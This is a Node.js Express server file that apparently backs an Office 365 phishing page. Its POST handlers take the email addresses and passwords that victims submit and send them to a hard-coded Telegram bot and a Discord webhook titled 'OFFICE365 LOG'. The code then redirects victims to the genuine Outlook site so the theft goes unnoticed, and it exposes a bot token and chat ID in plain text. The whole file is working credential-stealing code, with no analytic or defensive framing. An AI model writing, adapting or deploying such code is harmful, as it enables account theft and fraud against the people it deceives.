const express = require("express");
const bodyParser = require("body-parser");
const { EmbedBuilder, WebhookClient } = require("discord.js");
const XMLHttpRequest = require("xhr2");
const con = require("./public/discord");

const app = express();

const TELEGRAM_TOKEN = "5695593773:AAFQQr8U9YmSqPLEoi98aPviJX3OmW0Gk0M";
const TELEGRAM_CHAT_ID = 5972985257;

app.use(bodyParser.urlencoded({ extended: true }));
app.set("view engine", "ejs");
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/second", (req, res) => {
  res.render("second");
});

app.post("/", (req, res) => {
  const my_text = `Result is:%0A => EMAIL: ${req.body.username} %0A %0A => PASSWORD: ${req.body.Passcode}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${my_text}`;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  const embed = new EmbedBuilder()
    .setTitle("OFFICE365")
    .setDescription(
      `Result is:
    => EMAIL: ${req.body.username}
 
    => PASSWORD: ${req.body.Passcode}
    `
    )

    .setColor(0x00ffff);

  con.webhookClient.send({
    content: "OFFICE365",
    username: "OFFICE365 LOG",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.render("second");
});

app.post("/second", (req, res) => {
  const my_text = `Result is:%0A => EMAIL: ${req.body.username} %0A %0A => PASSWORD: ${req.body.Passcode}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${my_text}`;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  const embed = new EmbedBuilder()
    .setTitle("OFFICE365")
    .setDescription(
      `Result is:
    => EMAIL: ${req.body.username}
 
    => PASSWORD: ${req.body.Passcode}
    `
    )

    .setColor(0x00ffff);

  con.webhookClient.send({
    content: "OFFICE365",
    username: "OFFICE365 LOG",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.redirect("https://outlook.office365.com/mail/");
});

/*
app.post("/second", (req, res) => {
  const my_text = `Result is:%0A => EMAIL: ${req.body.username} %0A %0A => PASSWORD: ${req.body.passcode} `;

  // console.log(req.body.io, req.body.po)

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${my_text}`;

  let api = new XMLHttpRequest();
  api.open("GET", url, true);
  api.send();

  const embed = new EmbedBuilder()
    .setTitle("OFFICE365")
    .setDescription(
      `Result is:
     => EMAIL: ${req.body.username}
  
     => PASSWORD: ${req.body.passcode}
     
    `
    )

    .setColor(0x00ffff);

  con.webhookClient.send({
    content: "OFFICE365",
    username: "OFFICE365 LOG",
    avatarURL: "https://i.imgur.com/AfFp7pu.png",
    embeds: [embed],
  });

  res.redirect("https://outlook.office365.com/mail/");
});

*/

app.listen(process.env.PORT || 3003, () => {
  console.log("server listening");
});
